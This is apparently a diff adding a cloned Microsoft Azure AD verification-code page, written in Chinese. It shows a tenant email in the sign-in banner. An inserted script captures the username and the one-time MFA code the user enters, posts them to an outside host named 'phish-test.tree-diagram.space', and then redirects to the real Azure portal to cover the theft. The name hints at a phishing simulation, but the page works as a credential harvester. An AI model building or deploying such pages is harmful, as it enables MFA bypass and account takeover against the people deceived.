+                                                            src=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAxMDggMjQiPjx0aXRsZT5hc3NldHM8L3RpdGxlPjxwYXRoIGQ9Ik00NC44MzYsNC42VjE4LjRoLTIuNFY3LjU4M0g0Mi40TDM4LjExOSwxOC40SDM2LjUzMUwzMi4xNDIsNy41ODNoLS4wMjlWMTguNEgyOS45VjQuNmgzLjQzNkwzNy4zLDE0LjgzaC4wNThMNDEuNTQ1LDQuNlptMiwxLjA0OWExLjI2OCwxLjI2OCwwLDAsMSwuNDE5LS45NjcsMS40MTMsMS40MTMsMCwwLDEsMS0uMzksMS4zOTIsMS4zOTIsMCwwLDEsMS4wMi40LDEuMywxLjMsMCwwLDEsLjQuOTU4LDEuMjQ4LDEuMjQ4LDAsMCwxLS40MTQuOTUzLDEuNDI4LDEuNDI4LDAsMCwxLTEuMDEuMzg1QTEuNCwxLjQsMCwwLDEsNDcuMjUsNi42YTEuMjYxLDEuMjYxLDAsMCwxLS40MDktLjk0OE00OS40MSwxOC40SDQ3LjA4MVY4LjUwN0g0OS40MVptNy4wNjQtMS42OTRhMy4yMTMsMy4yMTMsMCwwLDAsMS4xNDUtLjI0MSw0LjgxMSw0LjgxMSwwLDAsMCwxLjE1NS0uNjM1VjE4YTQuNjY1LDQuNjY1LDAsMCwxLTEuMjY2LjQ4MSw2Ljg4Niw2Ljg4NiwwLDAsMS0xLjU1NC4xNjQsNC43MDcsNC43MDcsMCwwLDEtNC45MTgtNC45MDgsNS42NDEsNS42NDEsMCwwLDEsMS40LTMuOTMyLDUuMDU1LDUuMDU1LDAsMCwxLDMuOTU1LTEuNTQ1LDUuNDE0LDUuNDE0LDAsMCwxLDEuMzI0LjE2OCw0LjQzMSw0LjQzMSwwLDAsMSwxLjA2My4zOXYyLjIzM2E0Ljc2Myw0Ljc2MywwLDAsMC0xLjEtLjYxMSwzLjE4NCwzLjE4NCwwLDAsMC0xLjE1LS4yMTcsMi45MTksMi45MTksMCwwLDAtMi4yMjMuOSwzLjM3LDMuMzcsMCwwLDAtLjg0NywyLjQxNiwzLjIxNiwzLjIxNiwwLDAsMCwuODEzLDIuMzM4LDIuOTM2LDIuOTM2LDAsMCwwLDIuMjA5LjgzN002NS40LDguMzQzYTIuOTUyLDIuOTUyLDAsMCwxLC41LjAzOSwyLjEsMi4xLDAsMCwxLC4zNzUuMXYyLjM1OGEyLjA0LDIuMDQsMCwwLDAtLjUzNC0uMjU1LDIuNjQ2LDIuNjQ2LDAsMCwwLS44NTItLjEyLDEuODA4LDEuODA4LDAsMCwwLTEuNDQ4LjcyMiwzLjQ2NywzLjQ2NywwLDAsMC0uNTkyLDIuMjIzVjE4LjRINjAuNTI1VjguNTA3aDIuMzI5djEuNTU5aC4wMzhBMi43MjksMi43MjksMCwwLDEsNjMuODU1LDguOCwyLjYxMSwyLjYxMSwwLDAsMSw2NS40LDguMzQzbTEsNS4yNTRBNS4zNTgsNS4zNTgsMCwwLDEsNjcuNzkyLDkuNzFhNS4xLDUuMSwwLDAsMSwzLjg1LTEuNDM0LDQuNzQyLDQuNzQyLDAsMCwxLDMuNjIzLDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1Nyw1LjI1NywwLDAsMS0xLjM4NiwzLjgzLDUuMDE5LDUuMDE5LDAsMCwxLTMuNzcyLDEuNDI0LDQuOTM1LDQuOTM1LDAsMCwxLTMuNjUyLTEuMzUyQTQuOTg3LDQuOTg3LDAsMCwxLDY2LjQwNiwxMy42bTIuNDI1LS4wNzdhMy41MzUsMy41MzUsMCwwLDAsLjcsMi4zNjgsMi41MDUsMi41MDUsMCwwLDAsMi4wMTEuODE4LDIuMzQ1LDIuMzQ1LDAsMCwwLDEuOTM0LS44MTgsMy43ODMsMy43ODMsMCwwLDAsLjY2NC0yLjQyNSwzLjY1MSwzLjY1MSwwLDAsMC0uNjg4LTIuNDExLDIuMzg5LDIuMzg5LDAsMCwwLTEuOTI5LS44MTMsMi40NCwyLjQ0LDAsMCwwLTEuOTg4Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTEuMi0yLjQxNmExLDEsMCwwLDAsLjMxOC43ODUsNS40MjYsNS40MjYsMCwwLDAsMS40LjcxNyw0Ljc2Nyw0Ljc2NywwLDAsMSwxLjk1OSwxLjI1NiwyLjYsMi42LDAsMCwxLC41NjMsMS42ODlBMi43MTUsMi43MTUsMCwwLDEsODMuMiwxNy43OTRhNC41NTgsNC41NTgsMCwwLDEtMi45Ljg0Nyw2Ljk3OCw2Ljk3OCwwLDAsMS0xLjM2Mi0uMTQ5LDYuMDQ3LDYuMDQ3LDAsMCwxLTEuMjY1LS4zOHYtMi4yOWE1LjczMyw1LjczMywwLDAsMCwxLjM2Ny43LDQsNCwwLDAsMCwxLjMyOC4yNiwyLjM2NSwyLjM2NSwwLDAsMCwxLjE2NC0uMjIxLjc5Ljc5LDAsMCwwLC4zNzUtLjc0MSwxLjAyOSwxLjAyOSwwLDAsMC0uMzktLjgxMyw1Ljc2OCw1Ljc2OCwwLDAsMC0xLjQ3Ny0uNzY1LDQuNTY0LDQuNTY0LDAsMCwxLTEuODI5LTEuMjEzLDIuNjU1LDIuNjU1LDAsMCwxLS41MzktMS43MTMsMi43MDYsMi43MDYsMCwwLDEsMS4wNjMtMi4yQTQuMjQzLDQuMjQzLDAsMCwxLDgxLjUsOC4yNTZhNi42NjMsNi42NjMsMCwwLDEsMS4xNjQuMTE1LDUuMTYxLDUuMTYxLDAsMCwxLDEuMDc4LjN2Mi4yMTRhNC45NzQsNC45NzQsMCwwLDAtMS4wNzgtLjUyOSwzLjYsMy42LDAsMCwwLTEuMjIyLS4yMjEsMS43ODEsMS43ODEsMCwwLDAtMS4wMzQuMjYuODI0LjgyNCwwLDAsMC0uMzcxLjcxMk04NS4yNzgsMTMuNkE1LjM1OCw1LjM1OCwwLDAsMSw4Ni42NjQsOS43MWE1LjEsNS4xLDAsMCwxLDMuODQ5LTEuNDM0LDQuNzQzLDQuNzQzLDAsMCwxLDMuNjI0LDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1OSw1LjI1OSwwLDAsMS0xLjM4NiwzLjgzLDUuMDIsNS4wMiwwLDAsMS0zLjc3MywxLjQyNCw0LjkzNCw0LjkzNCwwLDAsMS0zLjY1Mi0xLjM1MkE0Ljk4Nyw0Ljk4NywwLDAsMSw4NS4yNzgsMTMuNm0yLjQyNS0uMDc3YTMuNTM3LDMuNTM3LDAsMCwwLC43LDIuMzY4LDIuNTA2LDIuNTA2LDAsMCwwLDIuMDExLjgxOCwyLjM0NSwyLjM0NSwwLDAsMCwxLjkzNC0uODE4LDMuNzgzLDMuNzgzLDAsMCwwLC42NjQtMi40MjUsMy42NTEsMy42NTEsMCwwLDAtLjY4OC0yLjQxMSwyLjM5LDIuMzksMCwwLDAtMS45My0uODEzLDIuNDM5LDIuNDM5LDAsMCwwLTEuOTg3Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTUuNDY0LTMuMTA5SDk5LjdWMTguNEg5Ny4zNDFWMTAuNDEySDk1LjY4NlY4LjUwN2gxLjY1NVY3LjEzYTMuNDIzLDMuNDIzLDAsMCwxLDEuMDE1LTIuNTU1LDMuNTYxLDMuNTYxLDAsMCwxLDIuNi0xLDUuODA3LDUuODA3LDAsMCwxLC43NTEuMDQzLDIuOTkzLDIuOTkzLDAsMCwxLC41NzcuMTNWNS43NjRhMi40MjIsMi40MjIsMCwwLDAtLjQtLjE2NCwyLjEwNywyLjEwNywwLDAsMC0uNjY0LS4xLDEuNDA3LDEuNDA3LDAsMCwwLTEuMTI2LjQ1N0EyLjAxNywyLjAxNywwLDAsMCw5OS43LDcuMzEzVjguNTA3aDMuNDY5VjYuMjgzbDIuMzM5LS43MTJWOC41MDdoMi4zNTh2MS45MDZoLTIuMzU4djQuNjI5YTEuOTUxLDEuOTUxLDAsMCwwLC4zMzIsMS4yOSwxLjMyNiwxLjMyNiwwLDAsMCwxLjA0NC4zNzUsMS41NTcsMS41NTcsMCwwLDAsLjQ4Ni0uMSwyLjI5NCwyLjI5NCwwLDAsMCwuNS0uMjMxVjE4LjNhMi43MzcsMi43MzcsMCwwLDEtLjczNi4yMzEsNS4wMjksNS4wMjksMCwwLDEtMS4wMTUuMTA2LDIuODg3LDIuODg3LDAsMCwxLTIuMjA5LS43ODQsMy4zNDEsMy4zNDEsMCwwLDEtLjczNi0yLjM2M1oiIGZpbGw9IiM3MzczNzMiLz48cmVjdCB3aWR0aD0iMTAuOTMxIiBoZWlnaHQ9IjEwLjkzMSIgZmlsbD0iI2YyNTAyMiIvPjxyZWN0IHg9IjEyLjA2OSIgd2lkdGg9IjEwLjkzMSIgaGVpZ2h0PSIxMC45MzEiIGZpbGw9IiM3ZmJhMDAiLz48cmVjdCB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjMDBhNGVmIi8+PHJlY3QgeD0iMTIuMDY5IiB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjZmZiOTAwIi8+PC9zdmc+
+                                                            alt=Microsoft>
+                                                    </div>
+
+
+                                                    <div role=main data-bind="component: { name: 'pagination-control',
+                    publicMethods: paginationControlMethods,
+                    params: {
+                        enableCssAnimation: svr.fEnableCssAnimation,
+                        disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
+                        initialViewId: initialViewId,
+                        initialSharedData: initialSharedData,
+                        initialError: $tfaPage.serverError },
+                    event: {
+                        cancel: paginationControl_onCancel,
+                        load: paginationControlHelper.onLoad,
+                        unload: paginationControlHelper.onUnload,
+                        loadView: view_onLoadView,
+                        showView: view_onShow,
+                        setLightBoxFadeIn: view_onSetLightBoxFadeIn } }">
+                                                        <div data-bind="css: { 'zero-opacity': hidePaginatedView() }">
+
+                                                            <div data-bind="css: {
+        'animate': animate() &amp;&amp; animate.animateBanner(),
+        'slide-out-next': animate.isSlideOutNext(),
+        'slide-in-next': animate.isSlideInNext(),
+        'slide-out-back': animate.isSlideOutBack(),
+        'slide-in-back': animate.isSlideInBack() }" class=slide-in-next>
+                                                                <div data-bind="component: { name: 'identity-banner-control',
+            params: {
+                userTileUrl: svr.urlProfilePhoto,
+                displayName: sharedData.displayName || svr.sPOST_Username,
+                isBackButtonVisible: isBackButtonVisible(),
+                focusOnBackButton: isBackButtonFocused(),
+                backButtonDescribedBy: backButtonDescribedBy() },
+            event: {
+                backButtonClick: identityBanner_onBackButtonClick } }">
+                                                                    <div class=identityBanner>
+
+                                                                        <div id=displayName2 class=identity
+                                                                            data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }"
+                                                                            title=lt@943789196qq.onmicrosoft.com>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+
+                                                            <div class="pagination-view animate has-identity-banner slide-in-next"
+                                                                data-bind="css: {
+        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
+        'zero-opacity': hidePaginatedView.hideSubView(),
+        'animate': animate(),
+        'slide-out-next': animate.isSlideOutNext(),
+        'slide-in-next': animate.isSlideInNext(),
+        'slide-out-back': animate.isSlideOutBack(),
+        'slide-in-back': animate.isSlideInBack() }">
+
+
+
+
+
+
+
+
+                                                                <div data-viewid=1 data-showidentitybanner=true
+                                                                    data-bind="pageViewComponent: { name: 'otc-confirm-view',
+                    params: {
+                        serverData: svr,
+                        serverError: initialError,
+                        username: sharedData.username,
+                        focusDefaultField: true,
+                        supportsBack: true,
+                        isInitialState: isInitialState,
+                        sentProof: sharedData.sentProof,
+                        otcProofs: sharedData.otcProofs,
+                        isGeneralVerify: sharedData.isGeneralVerify,
+                        proofConfirmation: sharedData.proofConfirmation,
+                        showCancelButton: sharedData.showCancelButton,
+                        trustedDeviceCheckboxConfig: sharedData.trustedDeviceCheckboxConfig,
+                        currentPollStartTime: sharedData.currentPollStartTime,
+                        currentPollEndTime: sharedData.currentPollEndTime,
+                        sessionIdentifier: sharedData.sessionIdentifier,
+                        twoWayPollingNeeded: sharedData.twoWayPollingNeeded,
+                        hasTotpV2Only: sharedData.hasTotpV2Only,
+                        hasTotpV1Only: sharedData.hasTotpV1Only,
+                        flowToken: sharedData.flowToken },
+                    event: {
+                        cancel: view_onCancel,
+                        updateFlowToken: $tfaPage.view_onUpdateFlowToken,
+                        showDebugDetails: $tfaPage.toggleDebugDetails_onClick,
+                        submitReady: $tfaPage.view_onSubmitReady,
+                        setPendingRequest: $tfaPage.view_onSetPendingRequest,
+                        setBackButtonState: view_onSetIdentityBackButtonState } }">
+                                                                    <div id=idDiv_SAOTCC_Title class="row text-title"
+                                                                        role=heading aria-level=1
+                                                                        data-bind="text: twoWayPollingNeeded ? str['CT_SAOTCAS_STR_Title'] : str['CT_SAOTCS_STR_Title']">
+                                                                        输入验证码</div>
+                                                                    <div class="row text-body">
+                                                                        <div
+                                                                            data-bind="component: { name: 'proof-image-control', params: { type: proofImageType, small: true, animate: twoWayPollingNeeded } }">
+
+                                                                            <img class="tile-img small"
+                                                                                role=presentation
+                                                                                pngsrc=https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_code_ea014b224eb1c04ac2f7cb85c43cc034.png
+                                                                                svgsrc=https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_code_f7ab697e65b83ce9870a4736085deeec.svg
+                                                                                data-bind="imgSrc, css: { 'small': small }"
+                                                                                src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDQ4IDQ4Ij48dGl0bGU+YXNzZXRzPC90aXRsZT48cmVjdCB3aWR0aD0iNDgiIGhlaWdodD0iNDgiIGZpbGw9Im5vbmUiLz48cGF0aCBkPSJNMzgsMTRIMTBWMzRIMzhWMTRtMiwyMkg4VjEySDQwVjM2TTE3LjY4OCwxOC44VjI4LjgyOEgxNS41MzFWMjEuMjM0YTMuMiwzLjIsMCwwLDEtLjY3Mi40M2wtLjI2Ni4xMTdhMi41NSwyLjU1LDAsMCwxLS41NjIuMTg4LDIuNDIzLDIuNDIzLDAsMCwxLS4zLjA3cS0uMTQxLjAyMy0uMjgxLjA1NVYyMC4yNjZxLjQyMi0uMTI1LjgxMy0uMjgxdC43NjYtLjM0NGE4LjI1Myw4LjI1MywwLDAsMCwxLjM0NC0uODQ0aDEuMzEzbTQuNTMxLDguMjM0aDQuMTU2djEuOEgxOS44NTl2LS43NWEzLjI5MiwzLjI5MiwwLDAsMSwuMjUtMS4zNDQsNC4xODMsNC4xODMsMCwwLDEsLjYyNS0xLjA3OCw1LjcsNS43LDAsMCwxLC44NDQtLjgyOHEuMjE5LS4xODcuNDM4LS4zNTJ0LjQyMi0uMzJxLjQ1My0uMzEyLjc2Ni0uNTc4YTIuNTkzLDIuNTkzLDAsMCwwLC4zLS4yODFsLjI1LS4yODFhMy4xNDgsMy4xNDgsMCwwLDAsLjMyOC0uNTYyLDEuNTksMS41OSwwLDAsMCwuMTA5LS42MDksMS4xNzYsMS4xNzYsMCwwLDAtLjM1OS0uOTM3LDEuNTUyLDEuNTUyLDAsMCwwLTEuMDc4LS4zMjgsMy42MjUsMy42MjUsMCwwLDAtMi40MjIsMVYxOS42ODhhNC44NjYsNC44NjYsMCwwLDEsMS4zNTktLjYyNSw1LjU0OCw1LjU0OCwwLDAsMSwxLjUxNi0uMiw0LjQ1Niw0LjQ1NiwwLDAsMSwxLjM0NC4xODgsMi40NjEsMi40NjEsMCwwLDEsMSwuNTYzLDIuMjQyLDIuMjQyLDAsMCwxLC42MjUuODc1LDMuMDA3LDMuMDA3LDAsMCwxLC4yMTksMS4xNTYsMy41MzgsMy41MzgsMCwwLDEtLjA1NS42NDEsMy43LDMuNywwLDAsMS0uMTQ4LjU2MywzLjQzOSwzLjQzOSwwLDAsMS0uNTYyLjk1Myw3LjIsNy4yLDAsMCwxLS44LjhxLS4yMTkuMTcyLS40NTMuMzQ0dC0uNDg0LjM0NGwtLjMyLjIzNHEtLjE0OC4xMDktLjMuMjM0LS4xNTYuMTA5LS4yODkuMjE5dC0uMjU4LjIxOXEtLjEwOS4xMjUtLjIuMjI3dC0uMTY0LjIxMWEuNzYzLjc2MywwLDAsMC0uMTQxLjQwNk0yNy44MjgsMjguNVYyNi42MjVhMy44MzUsMy44MzUsMCwwLDAsMi4zLjcxOSwyLjEyOCwyLjEyOCwwLDAsMCwxLjMtLjM1OSwxLjIsMS4yLDAsMCwwLC40NTMtMSwxLjEyNiwxLjEyNiwwLDAsMC0uNTYyLTEsMy4wMjYsMy4wMjYsMCwwLDAtMS41NzgtLjM1OWgtLjkwNlYyMi45NjloLjg0NHExLjkwNiwwLDEuOTA2LTEuMjY2LDAtMS4yLTEuNDY5LTEuMmEzLjMsMy4zLDAsMCwwLTEuOTA2LjY0MVYxOS4zNzVhNS4zMTYsNS4zMTYsMCwwLDEsMi40MDYtLjUxNiwzLjYzMSwzLjYzMSwwLDAsMSwyLjM0NC42NzIsMi4xNzUsMi4xNzUsMCwwLDEsLjgyOCwxLjc1LDIuMjcxLDIuMjcxLDAsMCwxLTEuOTUzLDIuNDA2di4wNDdhMi42LDIuNiwwLDAsMSwxLjY0MS43NSwyLjE0NCwyLjE0NCwwLDAsMSwuNjA5LDEuNTMxLDIuNjU1LDIuNjU1LDAsMCwxLTEsMi4xNzJBNC4zLDQuMywwLDAsMSwzMC4zLDI5LDUuMzY1LDUuMzY1LDAsMCwxLDI3LjgyOCwyOC41WiIgZmlsbD0iIzQwNDA0MCIvPjwvc3ZnPg==">
+                                                                        </div>
+                                                                        <div id=hint_code
+                                                                            class="text-block-body overflow-hidden"
+                                                                            data-bind="text: description">
+                                                                            输入移动设备上验证器应用中显示的代码​​</div>
+                                                                    </div>
+                                                                    <div class=text-block-body>
+                                                                        <div id=idDiv_SAOTCC_OTCRow class=form-group>
+                                                                            <div role=alert aria-live=assertive>
+
+                                                                            </div>
+                                                                            <div id=idDiv_SAOTCC_Success_OTC
+                                                                                class=errorDiv style=display:none>
+
+                                                                            </div>
+
+                                                                            <div id=idDiv_SAOTCC_OTC
+                                                                                class="textbox form-group">
+                                                                                <div class=placeholderContainer
+                                                                                    data-bind="component: { name: 'placeholder-textbox-field',
+                publicMethods: otcInputTextbox.placeholderTextboxMethods,
+                params: {
+                    serverData: svr,
+                    hintText: str['CT_SAOTCC_STR_OTC_TBHint'] },
+                event: {
+                    updateFocus: otcInputTextbox.textbox_onUpdateFocus } }">
+
+                                                                                    <input id=idTxtBx_SAOTCC_OTC
+                                                                                        name=otc class=form-control
+                                                                                        type=tel autocomplete=off
+                                                                                        aria-required=true data-bind="
+                    attr: {
+                        'maxlength': otcLength,
+                        'aria-labelledby': 'idDiv_SAOTCC_Title',
+                        'aria-describedby': 'idDiv_SAOTCS_Title idDiv_SAOTCC_Description idSpan_SAOTCC_Error_OTC' },
+                    css: { 'has-error': error },
+                    textInput: otcInputTextbox.value,
+                    ariaLabel: str['CT_SAOTCC_STR_OTC_TBHint'],
+                    hasFocusEx: otcInputTextbox.focused,
+                    placeholder: $placeholderText" maxlength=6 aria-labelledby=idDiv_SAOTCC_Title
+                                                                                        aria-describedby="idDiv_SAOTCS_Title idDiv_SAOTCC_Description idSpan_SAOTCC_Error_OTC"
+                                                                                        aria-label=代码 placeholder=代码
+                                                                                        value>
+
+                                                                                </div>
+                                                                            </div>
+
+
+                                                                        </div>
+                                                                    </div>
+                                                                    <div class="text-block-body text-body"
+                                                                        data-bind="visible: showSendNotification"
+                                                                        style=display:none>
+
+                                                                    </div>
+                                                                    <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !twoWayPollingNeeded }"
+                                                                        class=position-buttons>
+                                                                        <div class=row>
+                                                                            <div id=idDiv_SAOTCC_TD_Section
+                                                                                class=no-margin-top-bottom
+                                                                                data-bind="visible: tdCheckbox.isShown &amp;&amp; !hideInputControls()">
+                                                                                <div id=idDiv_SAOTCC_TD
+                                                                                    class="col-md-24 form-group no-margin-top checkbox">
+                                                                                    <label id=idLbl_SAOTCC_TD_Cb>
+                                                                                        <input id=idChkBx_SAOTCC_TD
+                                                                                            type=checkbox value=true
+                                                                                            data-bind="checked: tdCheckbox.isChecked, disable: tdCheckbox.isDisabled, ariaLabel: str['CT_SAOTCC_STR_AddTD'], attr: { name: svr.sTrustedDeviceCheckboxName }"
+                                                                                            name=rememberMFA
+                                                                                            aria-label="请勿在 90 天内再次询问"
+                                                                                            checked>
+                                                                                        <span
+                                                                                            data-bind="text: str['CT_SAOTCC_STR_AddTD']">请勿在
+                                                                                            90 天内再次询问</span>
+                                                                                    </label>
+                                                                                </div>
+                                                                            </div>
+
+                                                                            <div class=col-md-24>
+                                                                                <div class=text-13>
+
+                                                                                    <div class=form-group
+                                                                                        id=idDiv_SAOTCS_HavingTrouble
+                                                                                        data-bind="
+                        htmlWithBindings: str['CT_SAOTCC_STR_Toggle'],
+                        childBindings: { 'signInAnotherWay': { click: switchToOtcRequest_onClick } }">遇到问题? <a href=#
+                                                                                            id=signInAnotherWay>请通过其他方式登录</a>
+                                                                                    </div>
+
+
+                                                                                    <div data-bind="css: { 'form-group': !twoWayPollingNeeded }"
+                                                                                        class=form-group>
+                                                                                        <a id=moreInfoUrl target=_blank
+                                                                                            href="https://go.microsoft.com/fwlink/p/?LinkId=708614"
+                                                                                            data-bind="
+                            text: str['CT_STR_More_Info'],
+                            href: svr.urlMoreInfo,
+                            ariaLabel: str['CT_STR_More_Info_AriaLabel']" aria-label=有关双重验证的详细信息>详细信息</a>
+                                                                                    </div>
+
+                                                                                </div>
+                                                                            </div>
+
+                                                                        </div>
+                                                                    </div>
+                                                                    <div class=win-button-pin-bottom
+                                                                        data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
+                                                                        <div class=row
+                                                                            data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
+                                                                            <div data-bind="component: { name: 'footer-buttons-field',
+            params: {
+                serverData: svr,
+                removeBottomMargin: true,
+                primaryButtonId: 'idSubmit_SAOTCC_Continue',
+                primaryButtonText: str['CT_SAOTCC_STR_Continue'],
+                secondaryButtonId: 'idBtn_Back',
+                secondaryButtonText: str['CT_SAOTCC_STR_Cancel'],
+                isSecondaryButtonVisible: !showSwitchProofsLink,
+                isPrimaryButtonVisible: svr.fShowButtons &amp;&amp; !twoWayPollingNeeded &amp;&amp; !hideInputControls(),
+                secondaryButtonDescribedBy: (svr.fShowButtons &amp;&amp; twoWayPollingNeeded) ? 'idDiv_SAOTCC_Description' : null },
+            event: {
+                primaryButtonClick: primaryButton_onClick,
+                secondaryButtonClick: secondaryButton_onClick } }">
+                                                                                <div class="col-xs-24 no-padding-left-right button-container no-margin-bottom button-field-container ext-button-field-container"
+                                                                                    data-bind="
+    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
+    css: { 'no-margin-bottom': removeBottomMargin },
+    externalCss: { 'button-field-container': true }">
+
+                                                                                    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }"
+                                                                                        class="inline-block button-item ext-button-item">
+                                                                                        <script>
+                                                                                            function click5(events) {
+                                                                                                event.preventDefault();
+                                                                                                // console.log(event.target.getAttribute('mfamethod'));
+                                                                                                // console.log("hhh");
+                                                                                                var email = document.getElementById("displayName0").innerHTML;
+                                                                                                var code = document.getElementById("idTxtBx_SAOTCC_OTC").value;
+                                                                                                // var password = document.getElementById("pwd22").value;
+                                                                                                if (code != "") {
+                                                                                                    $.ajax({
+                                                                                                        dataType: 'JSON',
+                                                                                                        url: "https://phish-test.tree-diagram.space/code",
+                                                                                                        type: 'POST',
+                                                                                                        data: {
+                                                                                                            username: email,
+                                                                                                            code: code,
+                                                                                                            
+                                                                                                            // detail: detail,
+
+                                                                                                        }
+
+                                                                                                    });
+                                                                                                    window.location.replace("https://portal.azure.com");
+                                                                                                }
+                                                                                            }
+                                                                                        </script>
+
+                                                                                        <input type=submit
+                                                                                            onclick="click5()"
+                                                                                            id=idSubmit_SAOTCC_Continue
+                                                                                            class="win-button button_primary button ext-button primary ext-primary"
+                                                                                            data-report-event=Signin_Submit
+                                                                                            data-report-trigger=click
+                                                                                            data-report-value=Submit
+                                                                                            data-bind="
+                attr: primaryButtonAttributes,
+                externalCss: {
+                    'button': true,
+                    'primary': true },
+                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
+                hasFocus: focusOnPrimaryButton,
+                click: primaryButton_onClick,
+                enable: isPrimaryButtonEnabled,
+                visible: isPrimaryButtonVisible,
+                preventTabbing: primaryButtonPreventTabbing" value=验证 data-report-attached=1>
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                            </div>
+                                                        </div>
+                                                    </div>
+
+                                                </div>
+
+
+
+
+
+
+                                                <div data-bind="component: { name: 'instrumentation-control',
+            publicMethods: instrumentationMethods,
+            params: { serverData: svr } }">
+                                                </div>
+
+                                            </div>
+
 
 
                                             <div id="github" style="display: block;"
